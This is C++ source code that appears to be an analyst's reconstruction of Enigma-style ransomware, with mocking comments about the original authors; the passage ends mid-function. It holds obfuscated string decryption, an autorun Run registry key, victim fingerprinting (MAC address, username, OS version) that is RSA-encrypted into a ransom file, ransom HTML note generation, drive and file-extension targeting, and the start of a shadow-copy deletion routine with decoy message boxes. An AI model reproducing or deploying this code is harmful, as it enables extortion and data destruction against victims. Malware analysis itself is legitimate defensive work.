  doc_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*Y*-*%*C")));
  doc_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+x+x*t*;")));
  doc_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+x+x+%*;")));
  doc_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*%+%+C")));
  doc_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*%+C+Y")));
  doc_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*,*v+N")));
  doc_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*Y*-*%")));
  doc_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+x*v*;")));
  doc_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*Y*t+Y")));
  doc_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*,++*;")));
  doc_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+x+x+%+K")));
  doc_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+Y+K+Y")));
  doc_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*K*Y*-*%")));
  doc_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*Y*-*%+K")));
  doc_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+K*$+%")));
  doc_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+K*$+%+K")));
  doc_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+x+x+Y")));
  doc_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+x+x+Y+K")));
  doc_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+%+t*$*N+Y*v")));
  doc_exts_vector.push_back(converter.from_bytes(InnerDecrypt("%t*%*Y")));
  doc_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*%*Y")));
  doc_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*%+%+*")));
  doc_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*;*Y*C")));
  doc_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*Y++*+")));
  doc_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*Y*C**")));
  doc_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*%*Y+C")));
  doc_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+C+Y**")));
  doc_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*-*Y+Y")));
  doc_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*;*Y*C")));
  doc_exts_vector.push_back(converter.from_bytes(InnerDecrypt("+%*$*(")));
  doc_exts_vector.push_back(converter.from_bytes(InnerDecrypt("*;*t+K")));
  for (auto& doc : doc_exts_vector)
    std::cout << converter.to_bytes(doc) << ",";
  std::cout << std::endl << std::endl;
}

std::string InnerDecrypt(const std::string& input, size_t offset) {
  static const std::string inner_cypher_key{ ",N8VKiPrLMHTXZhyJ&jqA_m15tvbfa4nY@^F.-!RW0exD7;+l3g%OIzspS6E*(/coUkd:QwG2uC)$9B" };
  std::string tmp;
  std::string result;
  for (auto ch : input) {
    auto pos = inner_cypher_key.find(ch);
    if (pos < 2) {
      if (pos == 0)
        pos += offset;
      pos = inner_cypher_key.length() - 1 + pos;
    }
    tmp += inner_cypher_key[pos - offset];
  }
  for (int i = 0; i < tmp.length(); i += 2)
    result += std::stoi(tmp.substr(i, 2), NULL, 16);
  return result;
}

void CreateRegKey(const std::string& value, const std::string& data) {
  char buff[520];
  memset(buff, 0, 520);
  std::string quote{ "\"" }, quote_space{ "\" " };
  strcat_s(buff, 520, quote.c_str());
  strcat_s(buff, 520, data.c_str());
  strcat_s(buff, 520, quote_space.c_str());
  strcat_s(buff, 520, "\0");
  std::string sub_key = InnerDecrypt("v%*-**+Y++*t+C*vv$v$Y;*N*%+C*-+%*-**+Yv$v$v+*N*(*Y*-+++%v$v$Y%+v+C+C*v*(+Yv**v+C+%*N*-*(v$v$vC+v*(", 2); //Software\\Microsoft\\Windows\\CurrentVersion\\Run
  HKEY result;
  if (RegCreateKeyExA(HKEY_CURRENT_USER, sub_key.c_str(), 0, 0, 0, KEY_READ | KEY_WRITE, 0, &result, 0) == ERROR_SUCCESS) {
    std::string cooked_data{ buff };
    if (RegSetValueExA(result, value.data(), 0, REG_SZ, (BYTE*)cooked_data.data(), cooked_data.length()) == ERROR_SUCCESS) {
      RegCloseKey(result);
    }
  }
}

//create autorun registry key, you probably don't want to run it
void CreateAutostartRegKey() {
  char module_name[260];
  GetModuleFileNameA(NULL, module_name, 260);
  std::string ffbde_str = InnerDecrypt("*******Y*v*C***v*v*Y*****Y"); //fffdebfeedffd, same str
  CreateRegKey(module_name, ffbde_str);
}

//return formatted mac address from 1st adapter
//code stolen from stackoverflow by original authors, together with segfault
//http://stackoverflow.com/questions/13646621/how-to-get-mac-address-in-windows-with-c
std::string GetMac() {
  std::string iphlpapi_name { InnerDecrypt("YN+x*K*$+x*t+x*NC(*Y*$*$") }; //iphlpapi.dll
  auto hnd = LoadLibraryA(iphlpapi_name.c_str());
  std::string get_adapter_info_name{ InnerDecrypt("Y+*v+YYt*Y*t+x+Y*v+C+%YN*(***-") }; //GetAdaptersInfo
  auto res = GetProcAddress(hnd, get_adapter_info_name.c_str());
  auto get_adapter_proc = reinterpret_cast<DWORD(WINAPI *)(PIP_ADAPTER_INFO, PULONG)>(res);
  char result[18];
  PIP_ADAPTER_INFO adapRes = NULL;
  ULONG resSize = 0;
  if (get_adapter_proc(adapRes, &resSize)) {
    adapRes = new IP_ADAPTER_INFO[resSize / sizeof(IP_ADAPTER_INFO) + 1];
  }
  //resSize = sizeof(IP_ADAPTER_INFO); some insane code, as usual
  get_adapter_proc(adapRes, &resSize);
  //original code segfaulted when there is no net
  sprintf(result, "%02X:%02X:%02X:%02X:%02X:%02X", adapRes->Address[0], adapRes->Address[1],
    adapRes->Address[2], adapRes->Address[3], adapRes->Address[4],
    adapRes->Address[5], adapRes->Address[6]);
  return result;
}

std::string CreateHash(const std::string& input) {
  std::ostringstream ss;
  HCRYPTPROV hProv;
  HCRYPTHASH hHash;
  std::vector<BYTE> storage;
  auto res = CryptAcquireContextW(&hProv, 0, 0, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
  if (!res) {
    return "";
  }
  if (CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
    if (CryptHashData(hHash, (BYTE*)input.data(), input.length(), 0)) {
      DWORD resSize = 4;
      BYTE result[4];
      if (CryptGetHashParam(hHash, HP_HASHSIZE, result, &resSize, 0)) {
        storage.resize(result[0]);
        resSize = storage.size();
        res = CryptGetHashParam(hHash, HP_HASHVAL, &storage[0], &resSize, 0);
      } else {
        return "";
      }
    } else {
      return "";
    }
    CryptDestroyHash(hHash);
  } else {
    return "";
  }
  CryptReleaseContext(hProv, 0);
  for (auto i : storage) {
    ss << std::hex << std::setw(2) << std::setfill('0') << (int)i;
  }
  return ss.str();
}

inline std::string CreateInitVector() {
  static const char alphabet[] = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
  LARGE_INTEGER qc;
  QueryPerformanceCounter(&qc);
  srand(qc.LowPart);
  char random[19];
  for (int i = 0; i < 18; i++) {//initial vector
    random[i] = alphabet[rand() % 62];
  }
  random[18] = 0;
  std::string random_str{ random };
  for (int i = 4000; i != 0; i--) { //more time to break
    random_str = CreateHash(random_str);
  }
  return random_str;
}


bool TestExists(const std::wstring& fileName) {
  auto res = CreateFileW(fileName.c_str(), GENERIC_READ, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, false);
  if (res == INVALID_HANDLE_VALUE)
    return false;
  CloseHandle(res);
  return true;
}


bool getVersionNum(int& major, int& minor) {
  bool result = false;
  auto hnd = LoadLibrary(InnerDecrypt("Y(YvvYYtvxYN%%%CC(YYY$Y$").c_str()); //netapi32.dll
  auto func = GetProcAddress(hnd, InnerDecrypt("Y(*v+Yv+*,+%+Y*tY+*v+YYN*(***-").c_str()); //NetWkstaGetInfo
  auto func2 = GetProcAddress(hnd, InnerDecrypt("Y(*v+YYt+x*NYC+v*****v+CY*+C*v*v").c_str()); //NetApiBufferFree
  if (!func)
    return false;
  LPBYTE buff;
  auto res = ((NET_API_STATUS(WINAPI *)(LPWSTR, DWORD, LPBYTE))func)(0, 100, buff);
  if (res) {
    FreeLibrary(hnd);
    return false;
  }
  res = ((NET_API_STATUS(WINAPI *)(LPVOID))func)(buff);
  FreeLibrary(hnd);
  return true;
}

std::string getTime() {
  auto curTime = time(NULL);
  auto locTime = localtime(&curTime);
  char buff[80];
  strftime(buff, 80, "%Y-%m-%d.%X", locTime);
  return buff;
}

std::string getVersionString() {
  OSVERSIONINFOEXW ver;
  ver.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEXW);
  GetVersionExW((OSVERSIONINFOW*)&ver);
  int major, minor;
  getVersionNum(major, minor);// original code - second call
  if (getVersionNum(major, minor)) {
    ver.dwMajorVersion = major;
    ver.dwMinorVersion = minor;
  } else if (ver.dwMajorVersion == 6 && ver.dwMinorVersion == 2) {
    auto mask = VerSetConditionMask(0, VER_MINORVERSION, VER_EQUAL);
    ver.dwOSVersionInfoSize = 17;
    ver.dwMinorVersion = 3;
    if (VerifyVersionInfoW(&ver, VER_MINORVERSION, mask))
      ver.dwMinorVersion = 3;
  }
  auto hnd = GetModuleHandleA(kernel32.c_str());
  auto res = GetProcAddress(hnd, InnerDecrypt("Y+*v+YY(*t+Y*N+**vv%+N+%+Y*v*;YN*(***-").c_str()); //GetNativeSystemInfo
  SYSTEM_INFO sysInfo;
  if (!res) //mmm, x64 support, nice!
    GetSystemInfo(&sysInfo);
  else
    ((NET_API_STATUS(WINAPI *)(LPSYSTEM_INFO))res)(&sysInfo);
  std::string winStr;
  std::string win10Srv{ InnerDecrypt("v+*N*(*Y*-+++%Cx%t%xCxv%*v+C+**v+C") };
  std::string win10{ InnerDecrypt("v+*N*(*Y*-+++%Cx%t%x") };
  std::string winSrv12R2{ InnerDecrypt("v+*N*(*Y*-+++%Cxv%*v+C+**v+CCx%C%x%t%CCxvC%C") };
  std::string win81{ InnerDecrypt("v+*N*(*Y*-+++%Cx%KC(%t") };
  std::string winSrv12{ InnerDecrypt("v+*N*(*Y*-+++%Cxv%*v+C+**v+CCx%C%x%t%C") };
  std::string win8{ InnerDecrypt("v+*N*(*Y*-+++%Cx%K") };
  std::string winSrv08R2{ InnerDecrypt("v+*N*(*Y*-+++%Cxv%*v+C+**v+CCx%C%x%x%KCxvC%C") };
  std::string win7{ InnerDecrypt("v+*N*(*Y*-+++%Cx%+") };
  std::string winSrv08{ InnerDecrypt("v+*N*(*Y*-+++%Cxv%*v+C+**v+CCx%C%x%x%K") };
  std::string winVista{ InnerDecrypt("v+*N*(*Y*-+++%Cxv**N+%+Y*t") };
  std::string winXpx64{ InnerDecrypt("v+*N*(*Y*-+++%CxvKvxCx+K%*%Y") };
  std::string winSrv03{ InnerDecrypt("v+*N*(*Y*-+++%Cxv%*v+C+**v+CCx%C%x%x%%") };
  std::string winXp{ InnerDecrypt("v+*N*(*Y*-+++%CxvKvx") };
  std::string win2k{ InnerDecrypt("v+*N*(*Y*-+++%Cx%C%x%x%x") };
  std::string winUnk{ InnerDecrypt("+v*(*,*(*-++*(") };
  //here goes original insane if-switch
  //так пишут только мудаки!!!
  if (ver.dwMajorVersion == 10 && ver.wProductType == VER_NT_WORKSTATION)
    winStr = win10;
  if (ver.dwMajorVersion == 10 && ver.wProductType != VER_NT_WORKSTATION)
    winStr = win10Srv;
  if (ver.dwMajorVersion == 6 && ver.dwMinorVersion == 3 && ver.wProductType == VER_NT_WORKSTATION)
    winStr = win81;
  if (ver.dwMajorVersion == 6 && ver.dwMinorVersion == 3 && ver.wProductType != VER_NT_WORKSTATION)
    winStr = winSrv12R2;
  if (ver.dwMajorVersion == 6 && ver.dwMinorVersion == 2 && ver.wProductType == VER_NT_WORKSTATION)
    winStr = win8;
  if (ver.dwMajorVersion == 6 && ver.dwMinorVersion == 2 && ver.wProductType != VER_NT_WORKSTATION)
    winStr = winSrv12;
  if (ver.dwMajorVersion == 6 && ver.dwMinorVersion == 1 && ver.wProductType == VER_NT_WORKSTATION)
    winStr = win7;
  if (ver.dwMajorVersion == 6 && ver.dwMinorVersion == 1 && ver.wProductType != VER_NT_WORKSTATION)
    winStr = winSrv08R2;
  if (ver.dwMajorVersion == 6 && ver.dwMinorVersion == 0 && ver.wProductType == VER_NT_WORKSTATION)
    winStr = winVista;
  if (ver.dwMajorVersion == 6 && ver.dwMinorVersion == 0 && ver.wProductType != VER_NT_WORKSTATION)
    winStr = winSrv08;
  if (ver.dwMajorVersion == 6 && ver.dwMinorVersion == 0 && ver.wProductType != VER_NT_WORKSTATION)
    winStr = winSrv08;
  if (ver.dwMajorVersion == 5 && ver.dwMinorVersion == 2 && ver.wProductType == VER_NT_WORKSTATION
    && sysInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64)
    winStr = winXpx64;
  if (ver.dwMajorVersion == 5 && ver.dwMinorVersion == 2)
    winStr = winSrv03;
  if (ver.dwMajorVersion == 5 && ver.dwMinorVersion == 1)
    winStr = winXp;
  if (ver.dwMajorVersion == 5 && ver.dwMinorVersion == 0)
    winStr = win2k;
  if (ver.dwMajorVersion < 5)
    winStr = winUnk;
  std::string servPack{ InnerDecrypt("Cxv%*v+C+**N*%*vCxvx*t*%*,Cx") };//" Service Pack "

  //std::string fmt{ innerDecrypt("Cv*K*Y") };//%hd not needed
  servPack += std::to_string(ver.wServicePackMajor);
  return winStr + servPack;
}

std::string RsaEncrypt(const char* data, size_t dataLength) {
  HCRYPTPROV prov;
  HCRYPTKEY key;
  HCRYPTHASH hash;
  auto res = CryptAcquireContext(&prov, 0, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT);
  if (!res)
    std::cout << "e0475cfaded5bc768bc26ea31f55cfac";
  CryptImportKey(prov, kRsaPublicKey, sizeof(kRsaPublicKey), 0, 0, &key);
  CryptCreateHash(prov, CALG_SHA, 0, 0, &hash);
  hash = 0;
  CryptHashData(hash, kRsaPublicKey, sizeof(kRsaPublicKey), 0);
  CryptDeriveKey(hash, CALG_DSS_SIGN, hash, 0, &key); //does not work - pathetic
  char* curData = new char[64];
  //a bit more sane version than original
  int numChunks = ceil(double(dataLength) / chunkSize);
  std::string resultStr;
  if (numChunks) {
    char *cipherText = new char[numChunks * 64];
    auto pText = cipherText;
    DWORD cryptLen;
    CryptEncrypt(key, 0, 1, 0, 0, &cryptLen, 0);
    bool isFinal = false;
    while (numChunks--) {
      if (!numChunks)
        isFinal = true;
      memcpy(curData, data, 40);
      DWORD dataLen = 40;
      CryptEncrypt(key, 0, isFinal, 0, (BYTE*)curData, &dataLen, cryptLen);
      data += 40;
      memcpy(pText, curData, dataLen);
      pText += dataLen;
    }
    auto totalLen = pText - cipherText;
    char* readableText = new char[totalLen * 2 + 1];
    auto pRT = readableText;
    for (int i = 0; i < totalLen; i++) {
      sprintf(pRT, "%02x", cipherText);
      cipherText++;
      pRT += 2;
    }
    *pRT = 0;
    delete[] cipherText;
    resultStr = readableText;
    delete[] readableText;
  }
  delete[] curData;
  if (key)
    CryptDestroyKey(key);
  CryptReleaseContext(prov, 0);
  return resultStr;
}

bool CreateKeysGenerateHtml(const char* locale) {
  setlocale(LC_ALL, locale);
  std::cout << "7b418e360a5484eac39f03033e7a6d22" << std::endl;
  CreateMutex(NULL, false, NULL); //because why not?
  std::cout << "38d7bf4d6f755a7017b2426ebf0a212a" << std::endl;
  auto result_hash = CreateInitVector().substr(0, 18);
  //HERE
  lstrcpyA((char*)rsa_hash_wchar, CreateInitVector().c_str()); //used as wchar in thread 2
  lstrcpyA(rsa_hash, CreateInitVector().c_str());
  std::wstring targetFile;
  wchar_t tempBufw[260];
  char tempBuf[260];
  auto res = GetTempPathW(260, tempBufw);
  if (res) {
    temp_path = tempBufw;
  }
  auto hnd = LoadLibraryA(shell32.c_str());
  auto func = GetProcAddress(hnd, InnerDecrypt("v%YKY+*v+Yv%+x*v*%*N*t*$Y**-*$*Y*v+Cvx*t+Y*Kv+").c_str()); //SHGetSpecialFolderPathW
  res = ((BOOL(WINAPI *)(HWND, LPWSTR, int, BOOL))func)(0, tempBufw, CSIDL_DESKTOPDIRECTORY, false);
  if (res)
    desktop_dir = tempBufw;
  func = GetProcAddress(hnd, InnerDecrypt("v%YKY+*v+YY**-*$*Y*v+Cvx*t+Y*Kv+").c_str()); //SHGetFolderPathW -- noobs forgot to comment it out
  FreeLibrary(hnd);
  targetFile = temp_path;
  std::wstring wide = converter.from_bytes(falconStr);
  targetFile.append(wide);
  if (TestExists(targetFile)) {
    //some garbage output
    return 0; //so, if you have falcon9.falcon in your temp, virus does not work
  }
  targetFile = temp_path;
  enigma_dot_rsa = aEnigma + aRsa;
  wide = converter.from_bytes(enigma_dot_rsa);
  targetFile.append(wide);
  auto fhndt = CreateFileW(targetFile.c_str(), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
  if (fhndt != INVALID_HANDLE_VALUE) {
    auto len = i_hate_c.length();
    DWORD lenHigh;
    auto lenLow = GetFileSize(fhndt, &lenHigh);
    lenLow -= len;
    SetFilePointer(fhndt, lenLow, NULL, FILE_BEGIN);
    char buff[7];
    lenHigh = 0;
    ReadFile(fhndt, buff, 7, &lenHigh, 0);
    if (std::string(buff) == i_hate_c)
      //some more garbage
      return false;  //did not close handle
    CloseHandle(fhndt);
  }
  std::wstring doubleSlash = converter.from_bytes(InnerDecrypt("v$v$"));
  std::wstring tempFileNameW = temp_path + converter.from_bytes(enigma_dot_rsa);
  std::string  tempFileName = converter.to_bytes(tempFileNameW);
  htmlBody = std::regex_replace(htmlBody, std::regex(secondMark), tempFileName);
  tempFileNameW = desktop_dir + doubleSlash + converter.from_bytes(enigma_dot_rsa);
  tempFileName = converter.to_bytes(tempFileNameW);
  htmlBody = std::regex_replace(htmlBody, std::regex(firstMark), tempFileName);
  std::string htmlBr{ "<br>" };
  htmlBody = std::regex_replace(htmlBody, std::regex("\n"), htmlBr);
  htmlHead = std::regex_replace(htmlHead, std::regex(htaMark), htmlBody); //html ready
  std::wstring htmlFile = temp_path + converter.from_bytes(html_file_name);
  DeleteFileW(htmlFile.c_str());
  auto fhnd = CreateFileW(htmlFile.c_str(), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
  if (fhnd == INVALID_HANDLE_VALUE)
    return false;
  DWORD bytesWritten;
  WriteFile(fhnd, htmlHead.c_str(), htmlHead.length(), &bytesWritten, 0);
  CloseHandle(fhnd);
  htmlJS = std::regex_replace(htmlJS, std::regex("\n"), htmlBr);
  htmlJS = std::regex_replace(htmlJS, std::regex(htaMark), htmlBody); //second html with javascript
  htmlFile = temp_path + converter.from_bytes(js_file_name);
  DeleteFileW(htmlFile.c_str());
  fhnd = CreateFileW(htmlFile.c_str(), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
  if (fhnd == INVALID_HANDLE_VALUE)
    return false;
  WriteFile(fhnd, htmlHead.c_str(), htmlHead.length(), &bytesWritten, 0);
  CloseHandle(fhnd);
  //somethin interestin
  for (auto i : doc_exts_vector)
    if (i.size())
      all_extensions.push_back(i);
  for (auto i : script_exts_vector)
    if (i.size())
      all_extensions.push_back(i);
  for (auto i : media_exts_vector)
    if (i.size())
      all_extensions.push_back(i);
  for (auto i : archive_exts_vector)
    if (i.size())
      all_extensions.push_back(i);
  //vectorPtrs.resize(all_extensions.size()); // sane version
  /*for (int i = 0; i < all_extensions.size(); i++) //original code
    vectorStringPtrs.push_back(NULL);*/
  vector_filetype_count.reserve(all_extensions.size());
  std::wstring rsaFile = temp_path + converter.from_bytes(enigma_dot_rsa);
  char uNameBuff[0x101];
  DWORD buffSize = 0x101;
  GetUserNameA(uNameBuff, &buffSize);
  std::string uname{ uNameBuff };
  fhnd = CreateFileW(rsaFile.data(), GENERIC_READ, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
  char fileBuffer[1000];
  if (fhnd == INVALID_HANDLE_VALUE)
    return false;
  auto len = i_hate_c.length();
  DWORD lenHigh;
  auto lenLow = GetFileSize(fhnd, &lenHigh);
  DWORD bytesRead;
  bool readMore = true;
  while (readMore) {
    ReadFile(fhnd, fileBuffer, 1000, &bytesRead, 0);
    //if (bytesRead >= 1000) //original code
    if (!bytesRead) //sane code
      readMore = false;
    std::string dataRead{ fileBuffer }; //as if file is with text only
    size_t lastPos = 0, curPos = 0;
    //count endlines
    while (true) {
      curPos = dataRead.find("\n", lastPos, 1);
      if (curPos == std::string::npos)
        break;
      enigma_dot_rsa_newlines++;
      lastPos += curPos;
    }
  }
  CloseHandle(fhnd);
  if (enigma_dot_rsa_newlines)
    enigma_dot_rsa_newlines++;
  auto doubleSemicol = InnerDecrypt("%m%m");//::
  std::string dataToEncrypt{ "" };
  dataToEncrypt += InnerDecrypt("+x*t+%+%%m%m");//pass::
  dataToEncrypt += rsa_hash;
  dataToEncrypt += doubleSemicol;
  dataToEncrypt += InnerDecrypt("+%+Y*t+C+Y%(%(");//start>>
  dataToEncrypt += std::to_string(enigma_dot_rsa_newlines); //uint64_to_str
  dataToEncrypt += doubleSemicol;
  dataToEncrypt += uname;
  dataToEncrypt += doubleSemicol;
  dataToEncrypt += GetMac();
  dataToEncrypt += doubleSemicol;
  dataToEncrypt += getVersionString();//"Windows ver Service Pack num"
  dataToEncrypt += doubleSemicol;
  dataToEncrypt += getTime(); //time as "%Y-%m-%d.%X" format
  dataToEncrypt += doubleSemicol;
  dataToEncrypt += locale; //"null" as default
  dataToEncrypt += doubleSemicol;
  dataToEncrypt += mark_737; //"737"
  dataToEncrypt += doubleSemicol;
  dataToEncrypt += std::to_string(18); //"18"
  dataToEncrypt += doubleSemicol;
  dataToEncrypt += std::to_string(int(shadowCopyOff));
  dataToEncrypt += "\n";
  derived_key = doubleSemicol;
  derived_key.append(rsa_hash);
  derived_key += doubleSemicol;
  derived_key += uname;
  derived_key += doubleSemicol;
  derived_key += formatted_mac_string;
  derived_key += doubleSemicol;
  auto csum = RsaEncrypt(derived_key.data(), derived_key.length());
  csum += "\n";
  csum = doubleSemicol + csum;
  derived_key = csum;
  derived_key += doubleSemicol;
  derived_key += mark_737;
  dataToEncrypt += doubleSemicol;
  dataToEncrypt += derived_key;
  dataToEncrypt += "\n";
  fhnd = CreateFileW(rsaFile.data(), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL); // reopen for writing
  SetFilePointer(fhnd, GetFileSize(fhnd, &lenHigh), NULL, FILE_BEGIN); //lenHigh never used
  auto dataToWrite = RsaEncrypt(dataToEncrypt.data(), dataToEncrypt.length());
  dataToWrite += doubleSemicol;
  dataToWrite += mark_737;
  WriteFile(fhnd, dataToWrite.data(), dataToWrite.length(), &bytesWritten, NULL);
  CloseHandle(fhnd);
  return true;
}

std::vector<std::string> splitStringToVec(const std::string& input, const char* delim) {
  auto copyCstr = strdup(input.c_str());
  auto left = strtok(copyCstr, delim);
  std::vector<std::string> result;
  while (left) {
    result.push_back(left);
    left = strtok(NULL, delim);
  }
  free(copyCstr);
  return result;
}

DWORD WINAPI CheckEncFilesStats(LPVOID lpParameter) {
  temp_file = temp_path + converter.from_bytes(enigma_dot_rsa);
  LARGE_INTEGER qc;
  QueryPerformanceCounter(&qc);
  srand(qc.LowPart);
  std::string dataToDo;
  char random[16];
  for (int i = 0; i < 16; i++) //initial vector
    random[i] = secondAlphabet[rand() % 78];
  random[16] = 0;
  std::string hashStr{ random };
  std::string doubleSemicol{ InnerDecrypt("%m%m") }; //::
  while (!no_more_files) { //set in enigmaThread2
    std::cout << "dfe0bce5501ea80a3731c8eae98853f5" << std::endl;
    auto vecSize = vector_filetype_count.size();
    std::cout << "16ac0b067c4a1aba7931a53efb1e28ea" << std::endl;
    std::string workStatTick{ InnerDecrypt("v+Y-vCY,v%vYYtvYvYYNY%Y,v$*(") }; //WORKSTATTICK\n
    workStatTick += formatted_mac_string;
    workStatTick += "\n";
    std::cout << "9d313694f1375a98bf5edc6b7302e340" << std::endl;
    int i = 0;
    for (auto item : vector_filetype_count) {//inner loop 1
      auto numFiles = std::to_string(item);//number of matched files
      auto resultStr = converter.to_bytes(all_extensions[i++]);
      workStatTick += resultStr;
      workStatTick += "->";
      workStatTick += numFiles;
      workStatTick += "\n";
    }
    std::string backups = InnerDecrypt("YC*t*%*,vv+xv%+%v$*("); //BackUpSs//n
    if (shadowCopyOff) {
      backups = workStatTick + backups;
    }
    std::vector<std::string> localVector;
    int foundVectorPos = 99999;
    auto eniHandle = CreateFile(enigma_dot_rsa.c_str(), GENERIC_READ, 0, 0, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    if (eniHandle != INVALID_HANDLE_VALUE) {
      DWORD tmp;
      auto fileSize = GetFileSize(eniHandle, &tmp);
      auto buff = new char[fileSize];
      tmp = 0;
      ReadFile(eniHandle, buff, fileSize, &tmp, 0);
      std::string fileData{ buff };//file contents
      auto splitVec = std::move(splitStringToVec(fileData, "\n"));//split enigma file into sections
      if (splitVec.size() - 1 > 0) {
        for (unsigned i = 0; i < splitVec.size() - 1; i++) {
          if (splitVec[i].find(hashStr.c_str(), 0, 15) != std::string::npos)
            foundVectorPos = i;
          localVector.push_back(splitVec[i]);
        }
      }
      CloseHandle(eniHandle);
    }
    std::cout << "975b76915c4f08a07a8ceaafbf9c5d6b" << std::endl;
    auto encStr = RsaEncrypt(workStatTick.c_str(), workStatTick.length());
    std::string base{ hashStr };
    base += encStr;
    base.append(doubleSemicol);
    base.append(mark_737);
    base.append("\n");
    std::cout << "32b08af8f36bd540f6ce2aefef49c41a" << std::endl;
    //data remux
    if (foundVectorPos == 99999) {
      auto eniHandle = CreateFile(enigma_dot_rsa.c_str(), GENERIC_WRITE, 0, 0, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
      if (eniHandle != INVALID_HANDLE_VALUE) {
        DWORD tmp;
        auto fileSize = GetFileSize(eniHandle, &tmp);
        SetFilePointer(eniHandle, fileSize, 0, FILE_BEGIN);//append to file
        std::string baseEndl = base + '\n';
        DWORD bytesWritten;
        WriteFile(eniHandle, baseEndl.data(), baseEndl.length(), &bytesWritten, false);
        CloseHandle(eniHandle);
      }
    } else {
      auto eniHandle = CreateFile(enigma_dot_rsa.c_str(), GENERIC_WRITE, 0, 0, TRUNCATE_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
      if (eniHandle != INVALID_HANDLE_VALUE) {
        localVector[foundVectorPos] = base;
        for (auto& str : localVector) {
          auto buff = str + '\n';
          DWORD bytesWritten;
          WriteFile(eniHandle, buff.data(), buff.length(), &bytesWritten, false);
        }
        CloseHandle(eniHandle);
      }
    }
    std::cout << "1ed30e5d21edac51176d993dc06ec27e" << std::endl;
    Sleep(1000);
    std::cout << "20a8948ffaa6348f6caa8eb2aa15e42a" << std::endl;
  }//outter loop
  ExitThread(0);
}

void getDrives() {
  std::vector<std::string> localVector;
  localVector.push_back(InnerDecrypt("vv*(*,*(*-++*("));//Unknown
  localVector.push_back(InnerDecrypt("YN*(+**t*$*N*YCx+x*t+Y*K"));//Invalid path
  localVector.push_back(InnerDecrypt("vC*v*;*-+**t*C*$*v"));//Removable
  localVector.push_back(InnerDecrypt("Y**N+K*v*Y"));//Fixed
  localVector.push_back(InnerDecrypt("Y(*v+Y++*-+C*,Cx*Y+C*N+**v"));//Network drive
  localVector.push_back(InnerDecrypt("Y%YYC;vCY-Y;")); //CD-ROM
  localVector.push_back(InnerDecrypt("vCYtY;Cx*Y*N+%*,")); //RAM disk
  std::string driveSeparator{ InnerDecrypt("%mv$v$") };// :\\ /
  std::string ramDisk{ InnerDecrypt("vCYtY;Cx*Y*N+%*,") };
  std::string fixed{ InnerDecrypt("Y**N+K*v*Y") };
  std::string removable{ InnerDecrypt("vC*v*;*-+**t*C*$*v") };
  std::string netDrive{ InnerDecrypt("Y(*v+Y++*-+C*,Cx*Y+C*N+**v") };
  char drives[1024];
  GetLogicalDriveStrings(1024, drives);
  if (drives[0] == '\0')
    return;
  auto drivePtr = drives;
  int i = 0;
  while (*drivePtr) {
    std::string curDrive{ drivePtr };
    curDrive += ":"; //get drive letter - тут какое-то перемещение по указателю, пока не заморачивался
    if (localVector[GetDriveType(&drives[i])] == fixed
      || localVector[GetDriveType(&drives[i])] == netDrive) {
      std::cout << "5c1511181fb2fc13331a8f75030484cc" << std::endl;
      directories_queue.push(curDrive);
    }
    drivePtr += strlen(drivePtr) + 1;//move to next drive letter
  }
}
DWORD WINAPI turnShadowCopyOff(LPVOID lpParameter) {
  Sleep(10000);
  auto uhnd = LoadLibrary(user32.c_str());
  FARPROC mBoxFunc, execFunc;
  if (uhnd)
    mBoxFunc = GetProcAddress(uhnd, InnerDecrypt("Y; *v + %+%*t*+*vYC*-+KYt").data());
  auto shnd = LoadLibrary(shell32.c_str());
  if (shnd)
    execFunc = GetProcAddress(shnd, InnerDecrypt(shell_exec.data()).c_str());
  int counter = 0;
  while (counter < 1000) {
    auto command = "/C \"" + vssAdmCommand + "\"";
    if (mBoxFunc)
      ((int (WINAPI*) (HWND, LPCTSTR, LPCSTR, UINT))mBoxFunc)(NULL, decoyMessage1.data(), "Windows", MB_OK);
